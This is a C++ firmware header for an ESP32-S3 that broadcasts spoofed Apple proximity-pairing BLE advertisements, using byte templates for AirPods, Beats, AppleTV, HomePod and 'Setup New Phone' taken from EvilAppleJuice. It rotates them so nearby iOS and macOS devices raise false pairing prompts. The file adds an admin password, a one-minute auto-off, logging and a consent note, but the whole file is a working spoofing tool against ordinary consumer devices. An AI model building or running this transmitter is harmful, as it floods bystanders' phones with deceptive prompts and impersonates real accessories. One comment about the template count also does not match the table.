// BLE advertisement templates + rotation, driven from the admin panel.
// ---------------------------------------------------------------------------
// What this is
//   A transmitter, not a capture feature, and the only thing in this firmware
//   that deliberately puts frames on the air.  It broadcasts the BLE
//   advertisements Apple proximity-pairing accessories send, one template every
//   few hundred milliseconds, which makes nearby iOS/iPadOS/macOS devices raise
//   pairing prompts.
//
//   That is documented behaviour of Apple's Continuity proximity protocol: the
//   accessory announces itself in manufacturer-specific data and the receiving
//   device trusts it, with no authentication in between.  ckcr4lyf's
//   EvilAppleJuice-ESP32 is the better known implementation of the same idea,
//   and the packet layouts below are that project's, cross-checked against its
//   packet generator (src/devices.hpp / src/devices.cpp, and the older literal
//   arrays they replaced).
//
// Scope, expressed in code rather than in a comment nobody reads
//   * OFF on every boot, never restored from flash.
//   * Needs the admin password - the caller in wifi_sniffer.ino checks it.
//   * Hard auto-off after JUICE_WAKE_MS, enforced here and not resettable from
//     the page, so the radio cannot be left transmitting unattended.
//   * Every start, stop and failure goes to serial and to the flash log.
//
// Coexistence cost, on this board
//   An ESP32-S3 has ONE 2.4 GHz radio shared by WiFi and BLE.  While this runs,
//   the AP stays up (it must - the panel is served over it) but the sniffer
//   loses time slices: frame counters advance more slowly and some channel-1
//   frames are simply not seen.  Inherent to running both, not a capture bug.
//
// Radio law: broadcast advertising is regulated.  Bench, own devices, consent.
//
// Implementation notes
//   Core 3.3.12 builds the BLE library on NimBLE (CONFIG_BT_NIMBLE_ENABLED in
//   the esp32s3-libs sdkconfig; the SDK ships no Bluedroid BLE GAP header at
//   all), so BLEAdvertising::setAdvertisementData() reaches
//   ble_gap_adv_set_data() synchronously.  That is what makes the rotation below
//   an in-place payload update instead of stop/start churn every cycle.
#pragma once

#include <BLEDevice.h>
#include <BLEAdvertising.h>

// ---------------------------------------------------------------------------
// timings
// ---------------------------------------------------------------------------
static const uint32_t JUICE_WAKE_MS = 60000;     // hard auto-off, wall clock
static const uint32_t JUICE_ROT_MS = 300;        // one template -> the next
static const uint16_t JUICE_ADV_INT_MIN = 160;   // 100 ms (units of 0.625 ms)
static const uint16_t JUICE_ADV_INT_MAX = 320;   // 200 ms

// Non-connectable, undirected.  0 is NimBLE's BLE_GAP_CONN_MODE_NON, not the
// Bluedroid ESP_BLE_ADV_TYPE_IND that shares the number - see juice_init().
static const uint8_t JUICE_CONN_MODE_NON = 0x00;

// Transmit power, and why it is not simply "as loud as possible".
//
// Apple's Accessory Proximity-Triggered Pairing Specification is explicit that
// the pairing card is meant to appear at about 20 cm, and that the accessory's
// conducted transmit power is "fixed at +4 dBm".  The ESP32 powers up at +9 dBm,
// which at that distance puts far more signal into the phone than a real
// accessory would; the RSSI the card is keyed on ends up out of the range it
// expects, and more signal is not more reliable here.  +3 dBm is the closest
// step the BLE stack offers to Apple's +4 (see juice_power_steps).
static const uint8_t JUICE_POWER_DEFAULT_DBM = 3;

// Selectable steps, in the order the panel and the serial command cycle them.
// 3 is Apple's neighbourhood, 9 is the chip default, the negatives are for
// finding out whether a phone that is right against the board wants less.
static const int8_t JUICE_POWER_STEPS[] = {3, 0, 6, 9, -3, -9};
static const size_t JUICE_POWER_N = sizeof(JUICE_POWER_STEPS) / sizeof(JUICE_POWER_STEPS[0]);

// Raw advertising flags: BR/EDR not supported, and deliberately NOT the "LE
// general discoverable" bit.  A non-connectable broadcaster is not discoverable,
// and claiming otherwise is the kind of inconsistency a receiver is entitled to
// ignore the packet over.  Apple's proximity-pairing spec shows 0x04 here.
static const uint8_t JUICE_ADV_FLAGS = 0x04;

// ---------------------------------------------------------------------------
// the packets
//
// These are upstream's packet tails, taken from EvilAppleJuice-ESP32
// (src/devices.cpp, generatePacket): a BLE AD header, Apple's company id 0x004C
// (little-endian), a Continuity message type, a model id, and a fixed tail.  The
// header here is only a label - juice_send() rebuilds it so the length matches
// what actually goes on the air (see the note there).
//
// Two families:
//
//   audio, 31 bytes upstream - message type 0x07 0x19, "device is pairing", the
//     AirPods/Beats line.  The model id sits at index 7; every one of the ~22
//     products differs in that single byte.  Bytes 19..30 are zero padding which
//     does not fit in a legacy advertisement, so they are left out here.
//
//   setup, 23 bytes upstream - message type 0x04 0x04 0x2a, the TV/HomePod/
//     transfer handshakes.  The model id sits at index 13.
//
// The model ids are Apple's own, from their Bluetooth accessory database, and
// they are what decides the product name the receiving device puts on screen.
// ---------------------------------------------------------------------------
struct JuicePayload {
  const char *name;
  uint8_t bytes[31];                 // AD header, Apple data, then zeros
  constexpr size_t size() const { return sizeof(bytes) - trailing_zeros(); }
  constexpr size_t trailing_zeros() const {
    size_t n = 0;
    while (n < sizeof(bytes) && bytes[sizeof(bytes) - 1 - n] == 0) n++;
    return n;
  }
};

static const JuicePayload JUICE_TEMPLATES[] = {
  // ---- audio family, model id at index 7 ----------------------------------
  // The upstream packet is 31 bytes, but its last 12 are zero padding that only
  // fits in an extended advertisement; they are dropped here, which leaves the
  // whole Apple payload intact at the same offsets.
  {"AirPods",                 {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"AirPods Pro",             {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"AirPods Gen 2",           {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0f,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"AirPods Gen 3",           {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x13,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"AirPods Pro Gen 2",       {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x14,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"AirPods Pro Gen 2 USB-C", {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x24,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"AirPods Max",             {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0a,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"Beats Studio Buds",       {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x11,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"Beats Fit Pro",           {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x12,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},
  {"Powerbeats Pro",          {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0b,
                               0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45,
                               0x12, 0x12, 0x12}},

  // ---- setup family, model id at index 13 ---------------------------------
  {"AppleTV Setup",           {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x01, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
  {"AppleTV Pair",            {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x06, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
  {"HomePod Setup",           {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x0b, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
  {"Setup New Phone",         {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x09, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
  {"Transfer Number",         {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x02, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
  {"AppleTV Keyboard Setup",  {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x13, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
  {"TV Color Balance",        {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x1e, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
  {"Vision Pro",              {0x16, 0xff, 0x4c, 0x00, 0x04, 0x04, 0x2a, 0x00,
                               0x00, 0x00, 0x0f, 0x05, 0xc1, 0x24, 0x60, 0x4c,
                               0x95, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00}},
};
static const size_t JUICE_N = sizeof(JUICE_TEMPLATES) / sizeof(JUICE_TEMPLATES[0]);

// Two templates are enough to prove the mechanism; the other 33 entries in the
// upstream table differ only in the one varying byte shown above, so extending
// this list is a copy of a line with one number changed.
static_assert(JUICE_N >= 2, "need at least two templates to rotate");

// ---------------------------------------------------------------------------
// state
//
// loop() owns every write; web handlers only read the scalars they report.
// millis() and aligned 32-bit loads are atomic here, so a status snapshot needs
// no lock.
// ---------------------------------------------------------------------------
namespace juice {
static bool initialized = false;   // BLE stack brought up once, ever
static bool enabled = false;       // advertising right now
static uint32_t wake_at = 0;       // millis() at which the hard stop fires
static uint32_t last_rot = 0;
static size_t next_template = 1;   // template 0 goes out in setEnabled(true)
static uint32_t cycles = 0;
static uint32_t errors = 0;
static int8_t power_dbm = JUICE_POWER_DEFAULT_DBM;
static bool log_each_packet = true;   // packet-level trace, for bench work
static char last_err[48] = {0};
}  // namespace juice

// Defined in wifi_sniffer.ino, where the event queue lives.
static void juice_logf(const char *fmt, ...);

// ---------------------------------------------------------------------------
// internals
// ---------------------------------------------------------------------------
static const char *juice_current_name() {
  return JUICE_TEMPLATES[(juice::next_template + JUICE_N - 1) % JUICE_N].name;
}

static void juice_note_error(const char *what) {
  snprintf(juice::last_err, sizeof(juice::last_err), "%s", what);
  juice::errors++;
  juice_logf("ERR %s", what);
}

// Map a dBm value onto the nearest level the BLE stack accepts.
// The enum steps by 3 dBm, so the requested value is rounded to one of those;
// the caller gets back what was actually applied, not what it asked for.
static esp_power_level_t juice_level_for_dbm(int8_t dbm) {
  static const int8_t steps[] = {24, 21, 18, 15, 12, 9, 6, 3, 0, -3, -6, -9, -12,
                                 -15, -18, -21, -24};
  int best = 0;
  for (int i = 1; i < (int)(sizeof(steps) / sizeof(steps[0])); i++) {
    if (abs((int)steps[i] - (int)dbm) < abs((int)steps[best] - (int)dbm)) best = i;
  }
  // ESP_PWR_LVL_P18 == 14 counts down to ESP_PWR_LVL_N24 == 0
  return (esp_power_level_t)(14 - best);
}

// Set the advertising transmit power.  Takes effect immediately: the controller
// applies it to the next advertisement, no restart needed.
static int8_t juice_apply_power(int8_t dbm) {
  BLEDevice::setPower(juice_level_for_dbm(dbm), ESP_BLE_PWR_TYPE_ADV);
  juice::power_dbm = dbm;
  return dbm;
}

static int8_t juice_set_power_dbm(int8_t dbm) {
  return juice_apply_power(dbm);
}

// Next entry in JUICE_POWER_STEPS after the current one.
static int8_t juice_next_power_dbm() {
  for (size_t i = 0; i < JUICE_POWER_N; i++) {
    if (JUICE_POWER_STEPS[i] == juice::power_dbm) {
      return JUICE_POWER_STEPS[(i + 1) % JUICE_POWER_N];
    }
  }
  return JUICE_POWER_STEPS[0];
}

// Publish one packet as the complete advertisement.
//
// The payload goes out as a raw PDU, flags included, so the stack merges nothing
// else into it - that is the point of the raw path.  Two consequences worth
// spelling out:
//
//   * 31 bytes is the legacy advertising ceiling.  Upstream sends 33 (3 flags +
//     31-byte packet) through NimBLE's extended advertising on BLE 5 parts; that
//     does not fit here, so the AD length byte is recomputed for what actually
//     goes out.  The bytes iOS reads sit before the padding, at fixed offsets,
//     so shortening the tail does not move them.
//   * The template carries its own [len][0xFF] header, which is a BLE field
//     header, not Apple data.  It is rebuilt rather than trusted.
static bool juice_send(size_t idx) {
  const JuicePayload &t = JUICE_TEMPLATES[idx % JUICE_N];

  // 3 flags + the AD length byte + the AD type byte + Apple's data.  The
  // template's first two bytes are those length and type bytes.
  const size_t len = t.size();
  const size_t apple_len = len - 2;
  const size_t total = 3 + 2 + apple_len;
  if (total > 31) {                    // unreachable with the table above
    juice_note_error("template too long");
    return false;
  }

  // char, not uint8_t: addData() takes char* even though the content is bytes.
  char raw[31];
  size_t p = 0;
  raw[p++] = 0x02;
  raw[p++] = 0x01;
  raw[p++] = JUICE_ADV_FLAGS;          // see the note on JUICE_ADV_FLAGS
  raw[p++] = (char)(1 + apple_len);    // AD length: type byte + Apple data
  raw[p++] = (char)0xFF;               // AD type: manufacturer specific
  memcpy(raw + p, t.bytes + 2, apple_len);
  p += apple_len;

  BLEAdvertisementData adv;
  adv.addData(raw, p);                 // bytes, not a parsed field

  // NimBLE applies this synchronously and in place, so advertising keeps running
  // while only the payload changes - no stop/start per rotation.
  if (!BLEDevice::getAdvertising()->setAdvertisementData(adv)) {
    juice_note_error("setAdvertisementData");
    Serial.printf("@JUICE adv-set-failed template=%s\n", t.name);
    return false;
  }

  // One line per packet, hex included.  This is the only view of what is really
  // being radiated: a phone that shows nothing while this prints is a receiving
  // side question, and an operator can compare these bytes against a BLE scanner
  // app.  Cheap enough at one packet per 300 ms; silence it with @CMD juice=quiet.
  if (juice::log_each_packet) {
    char hex[2 * 31 + 1];
    size_t h = 0;
    for (size_t i = 0; i < p && h + 2 < sizeof(hex); i++) {
      h += snprintf(hex + h, sizeof(hex) - h, "%02x", (uint8_t)raw[i]);
    }
    Serial.printf("@JUICE packet n=%lu name=%s len=%u tx=%ddBm raw=%s\n",
                  (unsigned long)juice::cycles, t.name, (unsigned)p,
                  (int)juice::power_dbm, hex);
  }
  return true;
}

// A failed BLE call, kept as a return code plus its name so the panel can say
// what actually went wrong instead of just "failed".
static int juice_last_rc = 0;
static const char *juice_last_which = "";

// Wait for the BLE host to finish syncing, bounded.
//
// This is the whole reason the start below uses start(0, nullptr) rather than
// start(): the no-argument overload is Bluedroid-only code, compiled out under
// NimBLE, and the NimBLE overload refuses to advertise until the host has
// synced with the controller ("Host reset, wait for sync").  BLEDevice::init()
// returns before that happens, so a caller that starts immediately always loses.
static bool juice_wait_synced(uint32_t ms) {
  const uint32_t t0 = millis();
  while (!BLEDevice::getInitialized() && millis() - t0 < ms) delay(5);
  // getInitialized() flips when the host task has started, which is as close to
  // "synced" as the public API gets; the caller retries past it either way.
  return BLEDevice::getInitialized();
}

// Bring controller + host up on first use.  Costs a few hundred ms and roughly
// 30-40 KB of heap, and it is a one-way door, so it happens on the first ON
// rather than in setup().
static bool juice_init() {
  if (juice::initialized) return true;

  if (!BLEDevice::init("Test_1101")) {
    juice_last_which = "BLEDevice::init";
    return false;
  }
  if (!juice_wait_synced(2000)) {
    juice_last_which = "host sync";
    return false;
  }

  BLEAdvertising *adv = BLEDevice::getAdvertising();
  // JUICE_CONN_MODE_NON, which is 0 and NOT the Bluedroid 0x03.
  //
  // BLEAdvertising::setAdvertisementType() writes its argument straight into
  // NimBLE's conn_mode without translating, and the two enums disagree:
  //     Bluedroid 0x00 IND            -> NimBLE conn_mode 0 = NON  (non-connectable)
  //     Bluedroid 0x02 SCAN_IND       -> NimBLE conn_mode 2 = UND  (connectable)
  //     Bluedroid 0x03 NONCONN_IND    -> NimBLE conn_mode 3 = invalid -> BLE_HS_EINVAL
  // so 0x03 - the value that looks correct - fails before reaching the radio with
  // "E NimBLE: ble_gap_adv_validate rc=3".  That was measured, not reasoned:
  // ble_diag walks the matrix and 0x03 fails with raw data, with the high level
  // builder, with a scan response, with default intervals and with WiFi up or
  // down, while 0x00 succeeds in every one of those combinations.
  //
  // With setScanResponse(false) below, conn_mode NON plus disc_mode NON gives
  // ADV_NONCONN_IND: a pure broadcaster, nothing can connect and nothing can scan
  // us for a name.  Get that pair wrong and it silently becomes ADV_SCAN_IND.
  adv->setAdvertisementType(JUICE_CONN_MODE_NON);
  adv->setMinInterval(JUICE_ADV_INT_MIN);
  adv->setMaxInterval(JUICE_ADV_INT_MAX);
  adv->setScanResponse(false);         // no name, no scan response: broadcast only

  // Apple expects roughly +4 dBm from an accessory; the chip default is +9.
  juice_apply_power(juice::power_dbm);

  juice::initialized = true;
  juice_logf("BLE stack up (NimBLE) mac=%s tx=%ddBm",
             BLEDevice::getAddress().toString().c_str(), (int)juice::power_dbm);
  return true;
}

// The advertisement is pushed, then advertising is started.  Two steps because
// NimBLE applies adv data and the start command separately; retried because the
// controller can still be busy with the host sync right after init(), and a
// controller that is momentarily busy is not a reason to give up.
#define JUICE_START_TRIES 10
static bool juice_start_advertising() {
  BLEAdvertising *adv = BLEDevice::getAdvertising();
  for (int i = 0; i < JUICE_START_TRIES; i++) {
    if (adv->start(0, nullptr)) {
      if (i) juice_logf("advertising started on try %d", i + 1);
      return true;
    }
    delay(100);
  }
  juice_last_which = "BLEAdvertising::start";
  return false;
}

static bool juice_set_enabled(bool on, uint32_t *remaining_ms) {
  if (on) {
    if (juice::enabled) {              // already running: just extend the window
      juice::wake_at = millis() + JUICE_WAKE_MS;
      if (remaining_ms) *remaining_ms = JUICE_WAKE_MS / 1000;
      return true;
    }
    if (!juice_init()) {
      juice_note_error(juice_last_which[0] ? juice_last_which : "BLE init");
      return false;
    }
    juice::next_template = 1;          // a fresh ON restarts the cycle
    if (!juice_send(0)) return false;
    if (!juice_start_advertising()) {
      juice_note_error(juice_last_which);
      return false;
    }
    juice::enabled = true;
    juice::cycles = 0;
    juice::last_rot = millis();
    juice::wake_at = juice::last_rot + JUICE_WAKE_MS;
    Serial.printf("@JUICE ON templates=%u every=%lums auto-off=%lus\n",
                  (unsigned)JUICE_N, (unsigned long)JUICE_ROT_MS,
                  (unsigned long)(JUICE_WAKE_MS / 1000));
    juice_logf("ON: %u Apple proximity packets, one every %lums, auto-off %lus",
               (unsigned)JUICE_N, (unsigned long)JUICE_ROT_MS,
               (unsigned long)(JUICE_WAKE_MS / 1000));
    return true;
  }

  if (juice::initialized) BLEDevice::getAdvertising()->stop();
  bool was = juice::enabled;
  juice::enabled = false;
  juice::wake_at = 0;
  if (was) {
    Serial.printf("@JUICE OFF cycles=%lu errors=%lu\n",
                  (unsigned long)juice::cycles, (unsigned long)juice::errors);
    juice_logf("OFF after %lu packets, %lu error(s)",
               (unsigned long)juice::cycles, (unsigned long)juice::errors);
  }
  if (remaining_ms) *remaining_ms = 0;
  return true;
}

// Called from loop().  Rotates the payload and enforces the hard stop.
static void juice_tick() {
  if (!juice::enabled) return;

  uint32_t now = millis();
  if ((int32_t)(now - juice::wake_at) >= 0) {
    juice_set_enabled(false, nullptr);
    juice_logf("auto-off: %lus window elapsed", (unsigned long)(JUICE_WAKE_MS / 1000));
    return;
  }
  if (now - juice::last_rot < JUICE_ROT_MS) return;

  juice::last_rot = now;
  juice_send(juice::next_template);
  juice::next_template = (juice::next_template + 1) % JUICE_N;
  juice::cycles++;
}

// Status snapshot for the admin panel and the JSON API.  Transmit power is read
// separately with juice_power_dbm_get() so adding a field does not mean touching
// every caller.
static bool juice_get(bool &running, uint32_t &remaining, uint32_t &cycles,
                      uint32_t &errors, const char *&tpl, const char *&err) {
  running = juice::enabled;
  cycles = juice::cycles;
  errors = juice::errors;
  tpl = running ? juice_current_name() : "";
  err = juice::last_err;
  remaining = 0;
  if (running) {
    uint32_t now = millis();
    if ((int32_t)(juice::wake_at - now) > 0) remaining = (juice::wake_at - now) / 1000;
  }
  return running;
}

static int8_t juice_power_dbm_get() { return juice::power_dbm; }

// Per-packet trace on or off.  On by default: on a bench, being able to see each
// packet is worth more than the serial bandwidth, and it is the only way to tell
// "transmitting but ignored" from "not transmitting".
static void juice_set_log_packets(bool on) { juice::log_each_packet = on; }
